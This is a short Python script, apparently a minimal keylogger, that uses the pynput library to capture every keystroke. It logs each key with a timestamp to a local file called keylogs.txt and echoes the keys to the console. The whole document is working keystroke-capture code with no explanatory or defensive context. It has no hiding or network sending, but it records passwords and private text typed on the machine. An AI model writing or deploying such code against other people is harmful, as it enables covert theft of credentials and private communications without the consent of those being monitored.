from pynput import keyboard
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir+"keylogs.txt"), level = logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    try:
       print('{0}'.format(key.char))
    except AttributeError:
       print('{0}'.format(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

